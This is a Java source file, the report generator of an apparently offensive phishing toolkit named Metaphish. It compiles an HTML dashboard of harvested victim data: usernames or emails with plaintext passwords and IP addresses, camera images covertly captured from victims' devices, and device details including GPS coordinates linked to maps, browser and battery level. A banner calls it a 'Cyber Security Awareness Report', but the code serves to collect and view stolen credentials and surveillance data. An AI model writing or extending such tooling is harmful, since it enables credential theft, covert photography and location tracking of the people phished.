package com.metaphish.module;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Base64;
import java.util.List;
import java.util.Map;

public final class ReportGenerator {
    private final DataCapture DeviceCapture;
    private final FormCapture CredentialCapture;
    private final String ReportDirectory;
    private final String ImagesDirectory;

    public ReportGenerator(DataCapture DeviceCapture, FormCapture CredentialCapture,
                           String ReportDirectory, String ImagesDirectory) {
        this.DeviceCapture = DeviceCapture;
        this.CredentialCapture = CredentialCapture;
        this.ReportDirectory = ReportDirectory;
        this.ImagesDirectory = ImagesDirectory;
        new File(ReportDirectory).mkdirs();
    }

    public String Generate() throws IOException {
        String Timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyyMMdd_HHmmss"));
        String OutputPath = ReportDirectory + "/Metaphish_Report_" + Timestamp + ".html";

        List<Map<String, String>> Devices = DeviceCapture.LoadAll();
        List<Map<String, String>> Forms = CredentialCapture.LoadAll();

        StringBuilder Html = new StringBuilder();
        Html.append("<!DOCTYPE html><html lang=\"en\"><head>");
        Html.append("<meta charset=\"UTF-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">");
        Html.append("<title>Metaphish Report</title>");
        Html.append("<style>");
        Html.append("*{margin:0;padding:0;box-sizing:border-box}");
        Html.append("body{background:#0d0d0d;color:#e0e0e0;font-family:'Courier New',monospace;padding:2rem}");
        Html.append("h1{color:#00d4aa;font-size:2rem;margin-bottom:0.5rem}");
        Html.append(".subtitle{color:#888;margin-bottom:2rem}");
        Html.append(".stats{display:flex;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}");
        Html.append(".stat-card{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:8px;padding:1rem 1.5rem;min-width:160px}");
        Html.append(".stat-card .label{color:#888;font-size:0.75rem;text-transform:uppercase;letter-spacing:1px}");
        Html.append(".stat-card .value{color:#00d4aa;font-size:2rem;font-weight:bold;margin-top:0.25rem}");
        Html.append("h2{color:#00d4aa;border-bottom:1px solid #2a2a2a;padding-bottom:0.5rem;margin:2rem 0 1rem}");
        Html.append("table{width:100%;border-collapse:collapse;background:#1a1a1a;border-radius:8px;overflow:hidden}");
        Html.append("th{background:#222;color:#00d4aa;padding:0.75rem 1rem;text-align:left;font-size:0.8rem;text-transform:uppercase}");
        Html.append("td{padding:0.75rem 1rem;border-bottom:1px solid #2a2a2a;font-size:0.85rem;word-break:break-all}");
        Html.append("tr:last-child td{border-bottom:none}");
        Html.append("tr:hover td{background:#222}");
        Html.append(".camera-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:1rem}");
        Html.append(".camera-card{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:8px;overflow:hidden}");
        Html.append(".camera-card img{width:100%;display:block}");
        Html.append(".camera-card .camera-info{padding:0.75rem;font-size:0.75rem;color:#888}");
        Html.append(".badge{display:inline-block;padding:0.2rem 0.6rem;border-radius:4px;font-size:0.75rem}");
        Html.append(".badge-green{background:#0d2e1a;color:#00d4aa;border:1px solid #00d4aa}");
        Html.append(".badge-yellow{background:#2e2600;color:#ffd700;border:1px solid #ffd700}");
        Html.append(".gps-link{color:#4a9eff;text-decoration:none}");
        Html.append(".gps-link:hover{text-decoration:underline}");
        Html.append("</style></head><body>");

        Html.append("<h1>METAPHISH</h1>");
        Html.append("<div class=\"subtitle\">Cyber Security Awareness Report &mdash; Generated: ")
            .append(LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")))
            .append("</div>");

        Html.append("<div class=\"stats\">");
        Html.append(StatCard("Device Captures", String.valueOf(Devices.size())));
        Html.append(StatCard("Credentials", String.valueOf(Forms.size())));
        Html.append(StatCard("Camera Images", String.valueOf(CountImages())));
        Html.append(StatCard("GPS Locations", String.valueOf(CountGps(Devices))));
        Html.append("</div>");

        if (!Forms.isEmpty()) {
            Html.append("<h2>Captured Credentials</h2>");
            Html.append("<table><thead><tr>");
            Html.append("<th>#</th><th>Username / Email</th><th>Password</th><th>Timestamp</th><th>IP</th>");
            Html.append("</tr></thead><tbody>");
            int Idx = 1;
            for (Map<String, String> Form : Forms) {
                Html.append("<tr>");
                Html.append("<td>").append(Idx++).append("</td>");
                Html.append("<td>").append(Escape(Form.getOrDefault("Username", Form.getOrDefault("Email", "")))).append("</td>");
                Html.append("<td><span class=\"badge badge-yellow\">").append(Escape(Form.getOrDefault("Password", ""))).append("</span></td>");
                Html.append("<td>").append(Escape(Form.getOrDefault("Timestamp", ""))).append("</td>");
                Html.append("<td>").append(Escape(Form.getOrDefault("IpAddress", ""))).append("</td>");
                Html.append("</tr>");
            }
            Html.append("</tbody></table>");
        }

        List<String> ImageFiles = ListImages();
        if (!ImageFiles.isEmpty()) {
            Html.append("<h2>Camera Captures</h2>");
            Html.append("<div class=\"camera-grid\">");
            for (String ImageFile : ImageFiles) {
                try {
                    byte[] ImageBytes = Files.readAllBytes(Path.of(ImagesDirectory + "/" + ImageFile));
                    String Base64Data = Base64.getEncoder().encodeToString(ImageBytes);
                    String MimeType = ImageFile.endsWith(".png") ? "image/png" : "image/jpeg";
                    Html.append("<div class=\"camera-card\">");
                    Html.append("<img src=\"data:").append(MimeType).append(";base64,").append(Base64Data).append("\" alt=\"Camera capture\">");
                    Html.append("<div class=\"camera-info\">").append(Escape(ImageFile)).append("</div>");
                    Html.append("</div>");
                } catch (IOException Ignored) {}
            }
            Html.append("</div>");
        }

        if (!Devices.isEmpty()) {
            Html.append("<h2>Device Captures</h2>");
            Html.append("<table><thead><tr>");
            Html.append("<th>#</th><th>IP</th><th>Country</th><th>Device</th><th>Browser</th><th>GPS</th><th>Battery</th><th>Timestamp</th>");
            Html.append("</tr></thead><tbody>");
            int DevIdx = 1;
            for (Map<String, String> Device : Devices) {
                String Lat = Device.getOrDefault("GpsLatitude", "");
                String Lon = Device.getOrDefault("GpsLongitude", "");
                boolean HasGps = !Lat.isEmpty() && !Lat.equals("Permission Denied") && !Lat.equals("Not Available");

                Html.append("<tr>");
                Html.append("<td>").append(DevIdx++).append("</td>");
                Html.append("<td>").append(Escape(Device.getOrDefault("IpAddress", ""))).append("</td>");
                Html.append("<td>").append(Escape(Device.getOrDefault("IpCountry", ""))).append("</td>");
                Html.append("<td>").append(Escape(Device.getOrDefault("DeviceBrand", ""))).append(" ").append(Escape(Device.getOrDefault("DeviceModel", ""))).append("</td>");
                Html.append("<td>").append(Escape(Device.getOrDefault("Browser", ""))).append(" ").append(Escape(Device.getOrDefault("BrowserVersion", ""))).append("</td>");
                if (HasGps) {
                    Html.append("<td><a class=\"gps-link\" href=\"https://maps.google.com/?q=").append(Lat).append(",").append(Lon).append("\" target=\"_blank\">")
                        .append(Lat).append(", ").append(Lon).append("</a></td>");
                } else {
                    Html.append("<td><span class=\"badge badge-yellow\">No GPS</span></td>");
                }
                Html.append("<td>").append(Escape(Device.getOrDefault("BatteryLevel", ""))).append("</td>");
                Html.append("<td>").append(Escape(Device.getOrDefault("Timestamp", ""))).append("</td>");
                Html.append("</tr>");
            }
            Html.append("</tbody></table>");
        }

        Html.append("</body></html>");

        try (FileWriter Writer = new FileWriter(OutputPath)) {
            Writer.write(Html.toString());
        }
        return OutputPath;
    }

    private String StatCard(String Label, String Value) {
        return "<div class=\"stat-card\"><div class=\"label\">" + Label + "</div><div class=\"value\">" + Value + "</div></div>";
    }

    private String Escape(String Text) {
        if (Text == null) return "";
        return Text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;");
    }

    private int CountImages() {
        File ImagesDir = new File(ImagesDirectory);
        if (!ImagesDir.exists()) return 0;
        String[] Files = ImagesDir.list((Dir, Name) -> Name.endsWith(".jpg") || Name.endsWith(".png") || Name.endsWith(".jpeg"));
        return Files != null ? Files.length : 0;
    }

    private int CountGps(List<Map<String, String>> Devices) {
        int Count = 0;
        for (Map<String, String> Device : Devices) {
            String Lat = Device.getOrDefault("GpsLatitude", "");
            if (!Lat.isEmpty() && !Lat.equals("Permission Denied") && !Lat.equals("Not Available")) Count++;
        }
        return Count;
    }

    private List<String> ListImages() {
        File ImagesDir = new File(ImagesDirectory);
        if (!ImagesDir.exists()) return List.of();
        String[] FileNames = ImagesDir.list((Dir, Name) -> Name.endsWith(".jpg") || Name.endsWith(".png") || Name.endsWith(".jpeg"));
        return FileNames != null ? List.of(FileNames) : List.of();
    }
}
